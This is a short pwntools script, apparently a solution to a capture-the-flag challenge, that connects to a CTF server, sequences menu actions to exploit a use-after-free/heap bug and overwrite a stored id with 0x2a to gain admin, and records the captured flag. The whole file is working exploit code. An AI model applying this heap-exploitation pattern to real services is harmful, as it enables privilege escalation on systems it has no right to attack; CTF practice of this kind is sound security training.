#!/usr/bin/env python3

# admin id is 0x2a = 42

from pwn import *

binary = "./RAF01"

#p = process(binary)
p = remote('chall06.ctf.bde-kraken.com', 56784)

def apply():
    p.recv()
    p.sendline(b'a')
    p.recv()
    p.sendline(b'allo')

def leave():
    p.recv()
    p.sendline(b'd')

def send_message(msg):
    p.recv()
    p.sendline('c')
    p.recv()
    p.sendline(msg)

apply()
send_message('A' * 4)
leave()
send_message('B' * 4)
apply()
leave()
send_message(p64(0x2a))

#gdb.attach(p, '''heap-analysis''')

p.interactive()

"""
heap overflow in contact_form

HDCTF{Us3_4fter_fr3333333}
"""
